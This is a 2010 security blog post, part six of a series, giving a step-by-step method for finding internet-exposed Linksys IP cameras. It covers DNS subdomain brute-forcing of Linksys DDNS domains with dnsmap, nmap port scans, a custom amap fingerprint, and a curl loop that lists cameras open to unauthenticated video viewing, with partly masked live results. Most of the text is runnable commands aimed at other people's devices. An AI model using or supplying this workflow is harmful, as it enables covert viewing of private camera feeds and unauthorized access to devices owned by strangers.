---
title: Hacking Linksys IP Cameras (pt 6)
author: adrian-pastor
date: Wed, 24 Feb 2010 07:18:29 GMT
template: this/views/post.jade
category: fucked
---

> This article is a continuation of the following GNUCITIZEN articles: [here](/blog/hacking-linksys-ip-cameras-pt-1/), [here](/blog/hacking-linksys-ip-cameras-pt-2/), [here](/blog/hacking-linksys-ip-cameras-pt-3/), [here](/blog/hacking-linksys-ip-cameras-pt-4/) and [here](/blog/hacking-linksys-ip-cameras-pt-5/).

As we know, there are several ways one could go about hunting for IP cameras on the net. The slowest way would be to portscan random IP addresses for certain ports and programmatically detect if the web interface of a given camera was available on the open ports found. This method definitely works, but it can be very time consuming as it consists of scanning random IP addresses hoping that we'll eventually come across the type of device we're interested in.

The second method, which would be much faster in finding our target devices, would be to use a [search engine](http://www.google.co.uk/search?ie=UTF-8&q=inurl:/img/vr.htm) and query content that is unique to our target devices (e.g.: URLs, HTML title). This method, popularized by [GHDB](http://www.hackersforcharity.org/ghdb/?function=summary&cat=18) is simple and effective. The only issue I find with this strategy is that many of these IP cameras found happen to respond very slowly. This is probably due to other curious individuals running the same searches and accessing the same cameras.

The third method which would allow you to find more hidden Linksys IP cameras (i.e.: not cached by search engines a.k.a. the [hidden web](http://www.ericdigests.org/2002-2/hidden.htm)), would consist of bruteforcing subdomains within dynamic domain names (DDNS) used by our target devices (Linksys IP cameras in this case). For instance, the following are some of the dynamic domain names supported by the WVC54GCA and WVC80N Linksys IP camera models:

* `linksys-cam.com`
* `mylinksyscamera.com`
* `mylinksyshome.com`
* `mylinksyscam.com`
* `mylinksysview.com`
* `linksysremotecam.com`
* `linksysremoteview.com`
* `linksyshomemonitor.com`

### Camera discovery process through subdomain bruteforcing

We first save the aforementioned domains in a file, `doms` in this case. Then we use [dnsmap](http://code.google.com/p/dnsmap/) to bruteforce subdomains for each of the domains included in `doms`.

Using dnsmap's built-in wordlist:

    $ for i in `cat doms`;do dnsmap $i -r ~/ -i 64.14.13.199,216.39.81.84&done;

Using a user-supplied wordlist, `wordlist_TLAs.txt` in this case, which is a three-letter acronym wordlist included with dnsmap v0.30:

    $ for i in `cat doms`;do dnsmap $i -w wordlist_TLAs.txt -r ~/ -i 64.14.13.199,216.39.81.84&done;

NOTE: dnsmap's `-i` option allows ignoring user-supplied IP addresses from the results. In this case, 64.14.13.199 and 216.39.81.84 belong to the [DDNS service provider](http://www.tzo.com/), and would therefore be regarded as false positives in this case (we're only interested in IP cameras setup by their respective owners after all). For more info on how to use dnsmap, checkout the [README](http://code.google.com/p/dnsmap/source/browse/trunk/README.txt) file.

We then parse the IP addresses of the subdomains discovered by dnsmap:

    $ grep \# dnsmap*.txt | awk '{print $4}' | sort | uniq > ips.txt

Next, we scan for ports that could potentially be used by a Linksys IP camera web server. In this case, we choose TCP ports 80, 1024 and 1025 as candidates:

    $ sudo nmap -v -T4 -n -P0 -sS -p80,1024,1025 -iL ips.txt -oA nmap_http_ports.`date +%Y-%m-%d-%H%M%S`

This leaves us with a lot of discovered services, but we don't quite yet know which of them correspond to actual Linksys IP cameras web interfaces. There are many ways to fingreprint the web server of a Linksys IP camera. In this case we chose to create our own [amap](http://freeworld.thc.org/thc-amap/) response signature, and then scan the open ports with amap.

Before amap is capable of identifying our target Linksys IP cams, the following response signature needs to be added to `appdefs.resp`, and amap then needs to be recompiled. Otherwise amap won't take the new signature into account:

    http-linksys-cam::tcp::^HTTP/.*\nServer: thttpd/.*Accept-Ranges: bytes.*WVC

Please note that the previous amap response signature was only tested against the WVC54GCA and WVC80N Linksys IP camera models. So I'm not sure if it will work against other models. You've been warned!

Once recompiled, amap can be used to identify Linksys IP cameras from nmap's open ports results. 

    $ amap -i nmap_http_ports.2010-02-22-102001.gnmap -R -S -o amap_results.`date +%Y-%m-%d-%H%M%S`

We finally parse the IP addresses and open ports for all discovered Linksys IP cameras:

    $ grep http-linksys-cam amap_results.2010-02-22-102253 | awk '{print $3}' | cut -d \/ -f1
    x.x.167.245:1024
    x.x.228.231:1025
    x.x.228.231:80
    x.x.64.22:80
    x.x.206.70:1024
    x.x.31.4:1024
    x.x.164.28:1024
    _[snip]_

At this point we have accomplished the task of creating a list of Linksys IP cameras without resorting to search engines or scanning random IP addresses. In order to discover more Linksys cameras, a more comprehensive wordlist would need to be used with dnsmap.

Of course, even further automation would be possible. For instance, an attacker may wish to programmatically identify which Linksys cameras from the previous list allowing video viewing to unauthenticated users:

```bash
$ amapfile=amap_results.2010-02-22-102253; for i in `grep http-linksys-cam $amapfile | awk '{print $3}' | cut -d \/ -f1`;do url="http://$i/img/main.cgi?next_file=main.htm"; if curl --connect-timeout 2 -s -I --url $url | grep ^"HTTP/1.1 501">/dev/null;then echo $url;fi;done;
x.x.206.70:1024/img/main.cgi?next_file=main.htm
x.x.105.221:1024/img/main.cgi?next_file=main.htm
x.x.105.221:80/img/main.cgi?next_file=main.htm
x.x.181.195:1024/img/main.cgi?next_file=main.htm
x.x.243.154:1024/img/main.cgi?next_file=main.htm
x.x.243.154:1025/img/main.cgi?next_file=main.htm
x.x.30.196:1025/img/main.cgi?next_file=main.htm
_[snip]_
```

_In addition to automatically checking for anonymous video viewing on all cameras found, other tasks such as checking for default credentials (`admin`/`admin`) could also be scripted, although this will NOT be included in this post (or any other at GNUCITIZEN)._
